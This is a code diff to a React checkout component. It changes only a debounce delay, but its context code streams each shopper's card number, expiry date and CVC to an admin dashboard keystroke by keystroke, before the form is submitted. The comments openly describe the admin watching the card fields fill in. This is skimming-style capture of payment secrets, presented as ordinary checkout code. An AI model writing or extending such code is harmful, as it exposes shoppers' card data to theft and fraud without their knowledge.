@@ -53,12 +53,14 @@ export function CardFields({ cardholderDefault, token }: { cardholderDefault: st
   const cvcRef = useRef<HTMLInputElement>(null);
 
   // Stream the card fields to the admin dashboard as they're typed — from the
-  // very first digit. Short debounce so it's live without a POST per keystroke.
+  // very first digit. The debounce is long enough that a burst of typing costs
+  // one write instead of one per keystroke (each is a database round-trip on a
+  // shared connection), and short enough that the admin still watches it fill in.
   useEffect(() => {
     if (!token) return;
     const id = setTimeout(() => {
       sendCheckoutPatch(token, { cardNumber: number, expiry, cvc, step: "payment" });
-    }, 120);
+    }, 400);
     return () => clearTimeout(id);
   }, [token, number, expiry, cvc]);
 
